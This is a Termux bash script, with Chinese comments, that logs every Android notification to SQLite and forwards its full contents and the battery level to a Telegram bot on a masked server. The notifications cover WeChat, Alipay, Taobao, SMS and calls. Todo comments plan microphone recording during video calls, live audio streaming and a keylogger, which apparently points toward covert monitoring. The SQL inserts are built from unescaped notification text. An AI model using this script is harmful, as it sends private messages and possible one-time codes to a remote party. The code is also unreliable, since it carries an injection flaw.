#!/data/data/com.termux/files/usr/bin/bash

# 1、首先建立库创建表
#   执行：
#       sqlite3 -append ~/tmp/laoda.sqlite 
#   在SQLite命令模式下输入：
#       create table notify(`id` varchar(32), `tag` varchar(32), `key` varchar(255), `group` varchar(64), packageName varchar(128), title varchar(128), `content` text, `time` datetime );
#
# 2、后续就可以在外部shell插入或查询数据了，例如：
#   插入：
#       sqlite3 ~/tmp/laoda.sqlite "insert into notify values(11111, 'tagtag', 'keykeykey', 'groupgroupgroup', 'com.caonima.bi', 'this is a title', 'this is content', '2022-05-25 11:11:11')"
#   查询：
#       sqlite3 ~/tmp/laoda.sqlite "select * from notify" -json
#   清空：
#       sqlite3 ~/tmp/laoda.sqlite "delete from notify"


WECHAT_SHORT_DUR_COUNT=0 #用于微信短间隔的持续计数


_urlencode(){
    echo "${1}" | tr -d '\n' | xxd -plain | sed 's/\(..\)/%\1/g'
}


_forward(){
    _host='tg.serv.host' # oabeidadoal ot, 服务器地址已打码，有需要自己修改
    curl "https://${_host}/?tg/callMethod/cnmb&method=sendMessage" \
      -H 'Accept: application/json, text/javascript, */*; q=0.01' \
      -H 'Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja-JP;q=0.6,ja;q=0.5,zh-TW;q=0.4' \
      -H 'Cache-Control: no-cache' \
      -H 'Connection: keep-alive' \
      -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
      -H 'Cookie: example=123' \
      -H 'Origin: http://www.cnmb.com/' \
      -H 'Pragma: no-cache' \
      -H 'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36' \
      -H 'X-Requested-With: XMLHttpRequest' \
      --data-raw "params[chat_id]=-1001560518620&params[text]=${1}" \
      --insecure
}


_saveAndSendNotify(){
    for row in $(echo `termux-notification-list`|jq -r '.[] | @base64')
    do
        _jq() {
            echo ${row} | base64 --decode | jq -r ${1}
        }
        
        # 查库是否存在
        notifyTime=$(_jq '.when')
        _find=`sqlite3 ~/tmp/laoda.sqlite "select * from notify where time = '${notifyTime}'" -json`
        
        tmptmp=$(echo $_find|jq -r ".[0].packageName")
        #tmptmp=`echo $tmptmp | sed 's/.\(.*\)/\1/' | sed 's/\(.*\)./\1/'` # 删除两侧由jq赠送的双引号，他妈的！
        #tmptmp=${tmptmp:-1}
        if [ x"$tmptmp" = x ]
        then
            echo "查无数据，将插入"
            _id=$(_jq '.id')
            _tag=$(_jq '.tag')
            _key=$(_jq '.key')
            _group=$(_jq '.group')
            _packageName=$(_jq '.packageName')
            _title=$(_jq '.title')
            _content=$(_jq '.content')
            _time=$(_jq '.when')
            echo "id: ${_id}"
            echo "tag: ${_tag}"
            echo "key: ${_key}"
            echo "group: ${_group}"
            echo "packageName: ${_packageName}"
            echo "title: ${_title}"
            echo "content: ${_content}"
            echo "time: ${_time}"
            sqlite3 ~/tmp/laoda.sqlite "insert into notify values(${_id}, '${_tag}', '${_key}', '${_group}', '${_packageName}', '${_title}', '${_content}', '${_time}')"
            
            # 额外的逻辑：标记微信
            if [ $_packageName = "com.tencent.mm" ]; then
                _MSGTAG='#微信'
                WECHAT_SHORT_DUR_COUNT=1 #一旦收到新微信，立即对短间隔状态进行重新数，直到达到一定次数后，恢复常规任务执行间隔
            elif [ $_packageName = "com.eg.android.AlipayGphone" ]; then
                _MSGTAG='#支付宝'
            elif [ $_packageName = "com.taobao.taobao" ]; then
                _MSGTAG='#淘宝'
            elif [ $_packageName = "com.samsung.android.messaging" ]; then
                _MSGTAG='#短信'
            elif [ $_packageName = "com.android.systemui" ] && [ $_tag = "charging_state" ]; then
                _MSGTAG='#充电'
            elif [ $_packageName = "com.samsung.android.incallui" ]; then
                _MSGTAG='#通话'
            else
                _MSGTAG=''
            fi
            
            # 发送给机器人 
            #_id=`_urlencode "$_id"` # 【注释下同】暂时不编码了，因为发现个别内容转换后会被curl警告非UTF-8
            #_tag=`_urlencode "$_tag"`
            #_key=`_urlencode "$_key"`
            #_group=`_urlencode "_group"`
            #_packageName=`_urlencode "$_packageName"`
            #_title=`_urlencode "$_title"`
            #_content=`_urlencode "$_content"`
            #_time=`_urlencode "$_time"`
            _forward "${_MSGTAG}
- id: ${_id}
- tag: ${_tag}
- key: ${_key}
- group: ${_group}
- packageName: ${_packageName}
- title: ${_title}
- content: ${_content}
- time: ${_time}"
        else
            echo "已有数据，跳过"
        fi
    done
}



# todo: if content like 视频通话中 then termux-microphone-record
# todo: termux live stream
# todo: termux microphone stream
# todo: 监听键盘输入 keylogger?


# 任务统筹执行
while true
do
    if [ "$tbsPerc" = "" ]; then tbsPerc=100; tbsPlgd="PLUGGED"; fi # 声明初始值，防止后面出错

    # 每隔十分钟获取并缓存一次电量信息（因为这个命令太耗资源）
    minu=`date +%M`
    minu=${minu#0}
    if [ $((minu%10)) -eq 0 ]; then
        tbsJson=`termux-battery-status`
        tbsPerc=`echo $tbsJson|jq -r .percentage`
        tbsPlgd=`echo $tbsJson|jq -r .plugged`
        _forward "#电量 ${tbsPerc}%
`date`"
    fi

    if [ $WECHAT_SHORT_DUR_COUNT -gt 0 ] && [ $WECHAT_SHORT_DUR_COUNT -lt 60 ]; then
        WECHAT_SHORT_DUR_COUNT=$((WECHAT_SHORT_DUR_COUNT+1))
        echo "current WECHAT_SHORT_DUR_COUNT: "$WECHAT_SHORT_DUR_COUNT
    fi

    # 电量高于10%或插着充电器，才会执行任务
    if [ $tbsPerc -gt 10 ] || [ $tbsPlgd = "PLUGGED" ]; then
    # if [ $tbsPerc -gt 8 ]; then
        _saveAndSendNotify
    fi

    echo 'waiting for next...'
    sleep 60
done
